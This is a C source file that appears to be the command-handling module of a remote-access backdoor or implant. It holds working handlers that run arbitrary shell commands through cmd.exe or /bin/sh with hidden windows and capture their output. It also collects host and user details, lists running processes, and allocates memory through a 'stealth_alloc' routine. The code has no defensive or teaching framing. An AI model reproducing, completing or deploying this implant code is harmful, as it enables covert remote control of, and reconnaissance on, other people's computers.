/*
 * Command Implementation - Real functionality
 */

#include "commands.h"
#include "utils.h"
#include "config.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifdef PLATFORM_WINDOWS
    #include <windows.h>
    #include <tlhelp32.h>
    #include <psapi.h>
#else
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <sys/stat.h>
    #include <sys/utsname.h>
    #include <fcntl.h>
    #include <dirent.h>
    #include <signal.h>
#endif

// Command table
static const command_t g_commands[] = {
    {CMD_PING, "ping", cmd_ping, 0},
    {CMD_EXEC, "exec", cmd_exec, 0},
    {CMD_SYSINFO, "sysinfo", cmd_sysinfo, 0},
    {CMD_PS_LIST, "ps", cmd_ps_list, 0},
    {CMD_SHELL, "shell", cmd_shell, 0},
    {CMD_NOP, NULL, NULL, 0}
};

// Execute command by ID
int execute_command(command_id_t cmd_id, const uint8_t* args, size_t args_len,
                   uint8_t* output, size_t* output_len) {
    // Find command handler
    for (int i = 0; g_commands[i].handler; i++) {
        if (g_commands[i].id == cmd_id) {
            return g_commands[i].handler(args, args_len, output, output_len);
        }
    }
    
    // Unknown command
    const char* msg = "Unknown command";
    size_t msg_len = str_len(msg);
    if (*output_len >= msg_len) {
        mem_cpy(output, msg, msg_len);
        *output_len = msg_len;
    }
    return ERR_NOT_FOUND;
}

// Ping command
int cmd_ping(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    (void)args;
    (void)args_len;
    
    const char* msg = "PONG";
    size_t msg_len = str_len(msg);
    
    if (*output_len >= msg_len) {
        mem_cpy(output, msg, msg_len);
        *output_len = msg_len;
        return ERR_SUCCESS;
    }
    
    return ERR_INVALID_PARAM;
}

// Execute system command
int cmd_exec(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    if (!args || args_len == 0) {
        return ERR_INVALID_PARAM;
    }
    
    // Ensure null-terminated command
    char* cmd = (char*)stealth_alloc(args_len + 1);
    if (!cmd) {
        return ERR_OUT_OF_MEMORY;
    }
    
    mem_cpy(cmd, args, args_len);
    cmd[args_len] = '\0';
    
    int result;
    
#ifdef PLATFORM_WINDOWS
    // Windows implementation
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    
    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return ERR_UNKNOWN;
    }
    
    STARTUPINFOA si = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {0};
    
    char cmdline[512];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return ERR_UNKNOWN;
    }
    
    CloseHandle(hWritePipe);
    
    // Read output
    DWORD bytesRead;
    DWORD totalBytes = 0;
    char buffer[1024];
    
    while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        if (totalBytes + bytesRead <= *output_len) {
            mem_cpy(output + totalBytes, buffer, bytesRead);
            totalBytes += bytesRead;
        } else {
            break;
        }
    }
    
    *output_len = totalBytes;
    
    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    result = ERR_SUCCESS;
    
#else
    // Linux/Unix implementation
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        return ERR_UNKNOWN;
    }
    
    pid_t pid = fork();
    if (pid == -1) {
        close(pipefd[0]);
        close(pipefd[1]);
        return ERR_UNKNOWN;
    }
    
    if (pid == 0) {
        // Child process
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        
        execl("/bin/sh", "sh", "-c", cmd, NULL);
        _exit(127);
    }
    
    // Parent process
    close(pipefd[1]);
    
    size_t total_read = 0;
    ssize_t bytes_read;
    
    while ((bytes_read = read(pipefd[0], output + total_read, 
                             *output_len - total_read)) > 0) {
        total_read += bytes_read;
        if (total_read >= *output_len) {
            break;
        }
    }
    
    close(pipefd[0]);
    
    int status;
    waitpid(pid, &status, 0);
    
    *output_len = total_read;
    result = ERR_SUCCESS;
#endif
    
    return result;
}

// Get system information
int cmd_sysinfo(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    (void)args;
    (void)args_len;
    
    char info[1024];
    int len = 0;
    
#ifdef PLATFORM_WINDOWS
    // Windows system info
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    
    char computer[256] = {0};
    char username[256] = {0};
    DWORD size = sizeof(computer);
    GetComputerNameA(computer, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);
    
    OSVERSIONINFOA osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA(&osvi);
    
    len = snprintf(info, sizeof(info),
        "OS: Windows %lu.%lu Build %lu\n"
        "Computer: %s\n"
        "User: %s\n"
        "CPUs: %lu\n"
        "Memory: %llu MB\n"
        "Architecture: %s\n",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        computer, username,
        si.dwNumberOfProcessors,
        ms.ullTotalPhys / (1024 * 1024),
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86"
    );
    
#else
    // Linux/Unix system info
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    
    struct utsname un;
    uname(&un);
    
    long pages = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGE_SIZE);
    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
    
    char* username = getenv("USER");
    if (!username) username = "unknown";
    
    len = snprintf(info, sizeof(info),
        "OS: %s %s\n"
        "Computer: %s\n"
        "User: %s\n"
        "CPUs: %ld\n"
        "Memory: %ld MB\n"
        "Architecture: %s\n",
        un.sysname, un.release,
        hostname, username,
        cpus,
        (pages * page_size) / (1024 * 1024),
        un.machine
    );
#endif
    
    if (len > 0 && len < *output_len) {
        mem_cpy(output, info, len);
        *output_len = len;
        return ERR_SUCCESS;
    }
    
    return ERR_INVALID_PARAM;
}

// List processes
int cmd_ps_list(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    (void)args;
    (void)args_len;
    
    char* buf = (char*)output;
    size_t written = 0;
    size_t max_len = *output_len;
    
#ifdef PLATFORM_WINDOWS
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return ERR_UNKNOWN;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            int len = snprintf(buf + written, max_len - written,
                             "%5lu  %5lu  %s\n",
                             pe32.th32ProcessID,
                             pe32.th32ParentProcessID,
                             pe32.szExeFile);
            
            if (len > 0 && written + len < max_len) {
                written += len;
            } else {
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    
#else
    // Linux implementation
    DIR* dir = opendir("/proc");
    if (!dir) {
        return ERR_UNKNOWN;
    }
    
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        // Check if directory name is a PID
        char* endptr;
        long pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0') continue;
        
        // Read process info
        char path[256];
        snprintf(path, sizeof(path), "/proc/%ld/stat", pid);
        
        int fd = open(path, O_RDONLY);
        if (fd < 0) continue;
        
        char stat_buf[1024];
        ssize_t n = read(fd, stat_buf, sizeof(stat_buf) - 1);
        close(fd);
        
        if (n > 0) {
            stat_buf[n] = 0;
            
            // Parse comm (process name)
            char* comm_start = strchr(stat_buf, '(');
            char* comm_end = strrchr(stat_buf, ')');
            
            if (comm_start && comm_end && comm_end > comm_start) {
                *comm_end = 0;
                comm_start++;
                
                // Parse ppid (parent PID)
                char* p = comm_end + 2;
                char state;
                long ppid;
                sscanf(p, "%c %ld", &state, &ppid);
                
                int len = snprintf(buf + written, max_len - written,
                                 "%5ld  %5ld  %s\n",
                                 pid, ppid, comm_start);
                
                if (len > 0 && written + len < max_len) {
                    written += len;
                } else {
                    break;
                }
            }
        }
    }
    
    closedir(dir);
#endif
    
    *output_len = written;
    return ERR_SUCCESS;
}

// Shell command
int cmd_shell(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    // Just redirect to exec for now
    return cmd_exec(args, args_len, output, output_len);
}

// Process enumeration
int enumerate_processes(process_info_t** processes, size_t* count) {
    *processes = NULL;
    *count = 0;
    
#ifdef PLATFORM_WINDOWS
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return ERR_UNKNOWN;
    }
    
    // Count processes first
    size_t proc_count = 0;
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            proc_count++;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    // Allocate array
    *processes = (process_info_t*)stealth_alloc(sizeof(process_info_t) * proc_count);
    if (!*processes) {
        CloseHandle(hSnapshot);
        return ERR_OUT_OF_MEMORY;
    }
    
    // Fill array
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        size_t i = 0;
        do {
            (*processes)[i].pid = pe32.th32ProcessID;
            (*processes)[i].ppid = pe32.th32ParentProcessID;
            strncpy((*processes)[i].name, pe32.szExeFile, sizeof((*processes)[i].name) - 1);
            i++;
        } while (Process32Next(hSnapshot, &pe32) && i < proc_count);
        *count = i;
    }
    
    CloseHandle(hSnapshot);
    
#else
    // Linux: Parse /proc
    DIR* dir = opendir("/proc");
    if (!dir) {
        return ERR_UNKNOWN;
    }
    
    // Count processes first (rough estimate)
    size_t capacity = 256;
    *processes = (process_info_t*)stealth_alloc(sizeof(process_info_t) * capacity);
    if (!*processes) {
        closedir(dir);
        return ERR_OUT_OF_MEMORY;
    }
    
    struct dirent* entry;
    size_t i = 0;
    
    while ((entry = readdir(dir)) != NULL && i < capacity) {
        char* endptr;
        long pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0') continue;
        
        (*processes)[i].pid = pid;
        (*processes)[i].ppid = 0;  // Would need to parse /proc/PID/stat
        snprintf((*processes)[i].name, sizeof((*processes)[i].name),
                "Process_%ld", pid);
        i++;
    }
    
    *count = i;
    closedir(dir);
#endif
    
    return ERR_SUCCESS;
}

// Get current process ID
int get_current_process_id(void) {
#ifdef PLATFORM_WINDOWS
    return GetCurrentProcessId();
#else
    return getpid();
#endif
}